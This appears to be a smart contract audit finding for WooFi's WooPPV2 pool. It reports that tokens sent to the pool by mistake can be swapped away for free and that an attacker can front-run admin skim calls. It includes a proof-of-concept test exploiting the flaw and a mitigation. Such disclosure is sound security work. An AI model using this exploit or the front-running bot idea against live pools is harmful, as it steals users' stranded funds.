# Attacker can steal stuck tokens via swap

## Summary
If a user accidentally sends the quote token or one of the base tokens directly to the pool it can be used by an attacker to swap for free. 

## Vulnerability Detail
The internal functions (`_sellQuote`,` _sellBase`, `_swapBaseToBase`) called by `WooPPV2::swap` have a require statement to ensure that the token being swapped has been transferred to the pool before performing the swap.

If one of the base or quote tokens get accidentally sent directly to the pool, the expectation is that an admin would be able to return these to a user using `WooPPV2::skim`. However, a malicious user could use these to swap for free, subverting the need for them to supply their own `fromToken`. The malicious user could simply create a bot that watches for calls to `skim` and front-runs them to remove the tokens that are attempting to be recovered. 

## Impact
Malicious user can steal stuck funds. 

Protocols integrating with the `WooPPV2` pool directly may also be susceptible to this attack if they perform swaps in multiple transactions as the attacker could front-run transactions where a transfer is made directly to the pool to use the funds that have been sent.

## Code Snippet
[`_sellQuote`] (https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L478)

```solidity
        require(balance(quoteToken) - tokenInfos[quoteToken].reserve >= quoteAmount, "WooPPV2: !QUOTE");
```

[`_sellBase`](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L431)

```solidity
        require(balance(baseToken) - tokenInfos[baseToken].reserve >= baseAmount, "WooPPV2: !BASE");
```

[`_sellBaseToBase`](https://github.com/sherlock-audit/2024-03-woofi-swap/blob/main/WooPoolV2/contracts/WooPPV2.sol#L525)

```solidity
        require(balance(baseToken1) - tokenInfos[baseToken1].reserve >= base1Amount, "WooPPV2: !BASE1_BALANCE");
```

## POC
```solidity
function test_swappingWithStuckTokens() public {
        uint256 mintAmount = 10e8;
        address victim = address(0x4567);

        // setup: victim needs tokens to send to pool
        baseToken2.mint(victim, mintAmount);

        // 1. send tokens to pool
        vm.prank(victim);
        IERC20(baseToken2).transfer(address(pool), mintAmount);

        uint256 balanceBefore = IERC20(quoteToken).balanceOf(address(this));
        // 2. attacker swaps with other user's tokens
        pool.swap(address(baseToken2), address(quoteToken), mintAmount, 0, address(this), address(this));
        uint256 balanceAfter = IERC20(quoteToken).balanceOf(address(this));

        // assert that attacker's balance of baseToken2 increased after the swap
        t(balanceAfter > balanceBefore, "quote token balance doesn't increase after swap");
    }
```

## Recommendation
Create a whitelisting mechanism for the `WooPPV2::swap` that only allows it to be called directly by integrating protocols that have a non-vulnerable implementation of the swap function.
